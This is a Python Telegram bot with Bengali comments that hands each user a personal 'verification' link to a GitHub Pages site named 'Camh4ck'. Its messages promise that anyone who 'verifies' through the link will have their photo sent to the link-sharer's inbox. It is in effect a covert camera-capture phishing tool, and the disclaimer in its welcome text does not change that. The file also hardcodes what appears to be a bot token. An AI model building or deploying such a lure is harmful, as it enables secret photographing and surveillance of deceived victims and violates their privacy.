import telebot

# আপনার বোট টোকেন
BOT_TOKEN = "8403844691:AAG7ui2mJ08X8Q5kQ5jhpNoq1PGUqZpx6Ec"
bot = telebot.TeleBot(BOT_TOKEN)

# আপনার দেওয়া সেই ইমেজের সরাসরি লিঙ্ক
IMAGE_URL = "https://i.imghippo.com/files/Fq9968wg.jpg"
# আপনার GitHub ওয়েবসাইটের লিঙ্ক
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

# /start কমান্ড দিলে যা হবে
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "Welcome to 50/50 bot\n\n"
        "কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
        "আপনার রেফারেল লিঙ্ক পেতে /link লিখুন।"
    )
    # ফটোসহ মেসেজ পাঠানো
    bot.send_photo(message.chat.id, IMAGE_URL, caption=welcome_text)

# /link কমান্ড দিলে যা হবে
@bot.message_handler(commands=['link'])
def send_link(message):
    user_id = message.chat.id
    personal_link = f"{BASE_URL}?id={user_id}"
    
    response_text = (
        "আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
        f"🔗 লিঙ্ক: {personal_link}\n\n"
        "এই লিঙ্ক শেয়ার করুন। কেউ ভেরিফাই করলে তার ছবি সরাসরি আপনার এই ইনবক্সে আসবে।"
    )
    bot.reply_to(message, response_text)

print("বোটটি সচল আছে...")
bot.polling()
